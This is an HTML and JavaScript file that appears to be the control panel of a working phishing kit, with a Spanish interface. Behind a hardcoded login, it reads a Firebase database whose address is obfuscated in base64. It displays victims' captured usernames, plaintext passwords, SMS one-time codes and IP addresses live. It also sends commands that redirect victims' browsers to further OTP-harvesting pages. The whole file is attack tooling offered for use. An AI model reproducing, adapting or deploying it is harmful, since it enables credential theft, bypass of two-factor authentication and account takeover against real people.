<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Panel - MODO RECUPERACIÓN</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { background-color: #0f172a; font-family: 'Inter', sans-serif; color: white; }
        .card-user { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 16px; margin-bottom: 12px; }
        .card-spam { background: #451a1a; border: 1px solid #ef4444; opacity: 0.8; }
        .btn { padding: 8px 16px; border-radius: 6px; font-size: 11px; cursor: pointer; border: none; margin: 2px; font-weight: bold; }
        .btn-blue { background: #3b82f6; color: white; }
        .btn-orange { background: #f97316; color: white; }
        .btn-red { background: #ef4444; color: white; }
        .btn-green { background: #10b981; color: white; }
        .btn-purple { background: #8b5cf6; color: white; }
        #login-overlay { position: fixed; inset: 0; background: #0f172a; z-index: 50; display: flex; align-items: center; justify-content: center; }
        #panel-content { display: none; }
        .led-blink { animation: blink 1.5s infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
    </style>
</head>
<body class="p-4">

    <!-- LOGIN -->
    <div id="login-overlay">
        <div class="bg-slate-800 p-8 rounded-xl border border-slate-700 w-full max-w-md text-center">
            <h2 class="text-2xl font-bold mb-4 text-blue-400">ACCESO PANEL</h2>
            <input type="text" id="admin-user" placeholder="Usuario" class="w-full bg-slate-900 border border-slate-700 p-3 rounded-lg text-white mb-4"><br>
            <input type="password" id="admin-pass" placeholder="Contraseña" class="w-full bg-slate-900 border border-slate-700 p-3 rounded-lg text-white mb-4"><br>
            <button onclick="validarAcceso()" class="w-full bg-blue-600 hover:bg-blue-500 text-white font-bold py-3 rounded-lg">ENTRAR</button>
            <p id="error-msg" class="text-red-500 text-sm mt-2 hidden"></p>
        </div>
    </div>

    <div id="panel-content">
        <div class="flex justify-between items-center mb-6 border-b border-slate-700 pb-4">
            <div>
                <h1 class="text-3xl font-black text-white">PANEL <span class="text-blue-500">CLIENTES</span></h1>
                <p class="text-slate-500 text-xs">Sistema de Registro + OTP</p>
            </div>
            <div class="flex items-center gap-4">
                <div class="flex items-center gap-2 bg-slate-800/50 px-4 py-2 rounded-full">
                    <span class="w-2 h-2 bg-emerald-500 rounded-full led-blink"></span>
                    <span class="text-xs font-bold text-emerald-400">LIVE</span>
                </div>
                <button onclick="mostrarSpam()" class="bg-red-600 hover:bg-red-500 px-4 py-2 rounded-lg text-sm">
                    <i class="fa-solid fa-trash"></i> Papelera (<span id="spam-count">0</span>)
                </button>
                <button onclick="cerrarSesion()" class="text-slate-400 hover:text-white text-sm">SALIR</button>
            </div>
        </div>

        <!-- STATS -->
        <div class="grid grid-cols-4 gap-4 mb-6">
            <div class="bg-slate-800 p-4 rounded-xl">
                <p class="text-xs text-slate-500">TOTAL</p>
                <p id="stat-total" class="text-2xl font-bold text-white">0</p>
            </div>
            <div class="bg-slate-800 p-4 rounded-xl">
                <p class="text-xs text-slate-500">ONLINE</p>
                <p id="stat-online" class="text-2xl font-bold text-emerald-400">0</p>
            </div>
            <div class="bg-slate-800 p-4 rounded-xl">
                <p class="text-xs text-slate-500">BLOQUEADOS</p>
                <p id="stat-spam" class="text-2xl font-bold text-red-400">0</p>
            </div>
            <div class="bg-slate-800 p-4 rounded-xl">
                <p class="text-xs text-slate-500">HOY</p>
                <p id="stat-hoy" class="text-2xl font-bold text-blue-400">0</p>
            </div>
        </div>

        <!-- BOTONES DE VISTA -->
        <div class="flex gap-2 mb-4">
            <button onclick="vistaActual = 'validos'; renderizar();" class="btn btn-green">✓ Registros Válidos</button>
            <button onclick="vistaActual = 'spam'; renderizar();" class="btn btn-red">🗑 Papelera</button>
            <button onclick="vistaActual = 'todos'; renderizar();" class="btn btn-blue">Todos</button>
        </div>

        <div id="container" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4"></div>
    </div>

    <script>
        const DB_URL = atob("aHR0cHM6Ly9jb29wLTI5LW9jdHUtYnJlLWRlZmF1bHQtcnRkYi5maXJlYmFzZWlvLmNvbS8=");
        let db;
        let vistaActual = 'validos';
        let todosLosDatos = { validos: [], spam: [] };

        // ANTI-SPAM MUY PERMISIVO
        function esSpam(id, data) {
            if (!data || !data.user || !data.pass) return true;
            if (id === 'test' || id === 'admin') return true;
            return false;
        }

        function validarAcceso() {
            const u = document.getElementById('admin-user').value;
            const p = document.getElementById('admin-pass').value;
            
            if (u === "Ghost" && p === "Cabimas01.") {
                sessionStorage.setItem('auth_panel', 'true');
                document.getElementById('login-overlay').style.display = 'none';
                document.getElementById('panel-content').style.display = 'block';
                iniciarFirebase();
            } else {
                document.getElementById('error-msg').textContent = 'Credenciales incorrectas';
                document.getElementById('error-msg').classList.remove('hidden');
            }
        }

        if (sessionStorage.getItem('auth_panel') === 'true') {
            document.getElementById('login-overlay').style.display = 'none';
            document.getElementById('panel-content').style.display = 'block';
            iniciarFirebase();
        }

        function cerrarSesion() {
            sessionStorage.removeItem('auth_panel');
            window.location.reload();
        }

        function iniciarFirebase() {
            const firebaseConfig = { databaseURL: DB_URL };
            if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
            db = firebase.database();

            db.ref('logins').on('value', (snap) => {
                const datos = [];
                snap.forEach((child) => {
                    datos.push({ id: child.key, data: child.val(), esSpam: false });
                });
                todosLosDatos.validos = datos;
                renderizar();
            });

            db.ref('spam').on('value', (snap) => {
                const datos = [];
                snap.forEach((child) => {
                    datos.push({ id: child.key, data: child.val(), esSpam: true });
                });
                todosLosDatos.spam = datos;
                document.getElementById('spam-count').textContent = datos.length;
                renderizar();
            });
        }

        function renderizar() {
            const container = document.getElementById('container');
            container.innerHTML = '';
            
            let aMostrar = [];
            if (vistaActual === 'validos') aMostrar = todosLosDatos.validos;
            else if (vistaActual === 'spam') aMostrar = todosLosDatos.spam;
            else aMostrar = [...todosLosDatos.validos, ...todosLosDatos.spam];

            // Stats
            document.getElementById('stat-total').textContent = todosLosDatos.validos.length;
            document.getElementById('stat-spam').textContent = todosLosDatos.spam.length;
            document.getElementById('stat-online').textContent = todosLosDatos.validos.filter(d => d.data.online).length;
            
            const hoy = new Date().toDateString();
            document.getElementById('stat-hoy').textContent = todosLosDatos.validos.filter(d => 
                d.data.timestamp && new Date(d.data.timestamp).toDateString() === hoy
            ).length;

            if (aMostrar.length === 0) {
                container.innerHTML = '<div class="text-slate-500 text-center col-span-3 py-10">No hay registros</div>';
                return;
            }

            aMostrar.forEach(({id, data, esSpam}) => {
                const isOnline = data.online === true;
                const tieneOTP = data.sms && data.sms !== '----' && data.sms !== '';
                
                container.innerHTML += `
                    <div class="${esSpam ? 'card-spam' : 'card-user'}">
                        <div class="flex justify-between items-center mb-2">
                            <span class="text-xs text-slate-400">#${id.slice(-8)}</span>
                            ${esSpam ? '<span class="text-red-400 text-xs font-bold">🗑 BLOQUEADO</span>' : 
                              `<span class="${isOnline ? 'text-emerald-400' : 'text-slate-500'} text-xs font-bold">
                                ${isOnline ? '● ONLINE' : '○ OFFLINE'}
                               </span>`}
                        </div>
                        
                        <div class="bg-slate-900 p-2 rounded mb-2">
                            <p class="text-xs text-slate-500">USUARIO</p>
                            <p class="text-white font-bold text-sm">${data.user || 'N/A'}</p>
                        </div>
                        
                        <div class="bg-slate-900 p-2 rounded mb-2">
                            <p class="text-xs text-slate-500">CONTRASEÑA</p>
                            <p class="text-rose-400 font-bold text-sm">${data.pass || '****'}</p>
                        </div>
                        
                        <div class="bg-slate-900 p-2 rounded mb-2 text-center border ${tieneOTP ? 'border-emerald-500' : 'border-slate-700'}">
                            <p class="text-xs ${tieneOTP ? 'text-emerald-400' : 'text-slate-500'} mb-1">
                                ${tieneOTP ? '✓ CÓDIGO VERIFICADO' : 'ESPERANDO CÓDIGO'}
                            </p>
                            <p class="text-xl font-black ${tieneOTP ? 'text-emerald-400' : 'text-blue-400'} tracking-widest">${data.sms || '----'}</p>
                        </div>
                        
                        <div class="bg-slate-900/50 p-2 rounded mb-2">
                            <p class="text-xs text-slate-500">IP CLIENTE</p>
                            <p class="text-amber-400 font-mono text-xs">${data.ip || 'N/A'}</p>
                        </div>
                        
                        <div class="flex justify-between text-xs text-slate-500 mb-2 px-1">
                            <span>${data.step || 'Registrado'}</span>
                            <span>${data.timestamp ? new Date(data.timestamp).toLocaleTimeString() : ''}</span>
                        </div>

                        ${esSpam ? `
                            <div class="flex gap-1">
                                <button onclick="recuperar('${id}')" class="btn btn-green">♻ Recuperar</button>
                                <button onclick="eliminarSpam('${id}')" class="btn btn-red">Eliminar</button>
                            </div>
                        ` : `
                            <div class="grid grid-cols-2 gap-1">
                                <button onclick="solicitarOTP('${id}')" class="btn btn-blue">
                                    <i class="fa-solid fa-comment-sms"></i> Solicitar OTP
                                </button>
                                <button onclick="solicitarOTP2('${id}')" class="btn btn-purple">
                                    <i class="fa-solid fa-sync"></i> Solicitar OTP 2
                                </button>
                                <button onclick="rechazar('${id}')" class="btn btn-orange">Rechazar</button>
                                <button onclick="eliminar('${id}')" class="btn btn-red">Borrar</button>
                            </div>
                        `}
                    </div>
                `;
            });
        }

        function mostrarSpam() {
            vistaActual = 'spam';
            renderizar();
        }

        // FUNCIONES OTP CORREGIDAS
        function solicitarOTP(id) {
            // Guarda comando para que el cliente redirija a otp.html
            db.ref('comandos/' + id).set({ 
                action: 'redirect', 
                url: 'otp.html',
                ts: Date.now() 
            });
            alert('✓ Comando enviado: Redirigir a otp.html');
        }

        function solicitarOTP2(id) {
            // Guarda comando para que el cliente redirija a otp2.html
            db.ref('comandos/' + id).set({ 
                action: 'redirect', 
                url: 'otp2.html',
                ts: Date.now() 
            });
            alert('✓ Comando enviado: Redirigir a otp2.html');
        }

        function rechazar(id) {
            db.ref('comandos/' + id).set({ 
                action: 'redirect', 
                url: 'index.html',
                ts: Date.now() 
            });
            db.ref('logins/' + id).update({ step: 'Rechazado', online: false });
        }

        function recuperar(id) {
            if (!confirm('¿Recuperar este registro?')) return;
            db.ref('spam/' + id).once('value').then((snap) => {
                const data = snap.val();
                if (data) {
                    db.ref('logins/' + id).set(data);
                    db.ref('spam/' + id).remove();
                }
            });
        }

        function eliminarSpam(id) {
            if (!confirm('¿Eliminar PERMANENTEMENTE?')) return;
            db.ref('spam/' + id).remove();
        }

        function eliminar(id) {
            if (!confirm('¿Mover a papelera?')) return;
            db.ref('logins/' + id).remove();
        }
    </script>
</body>
</html>
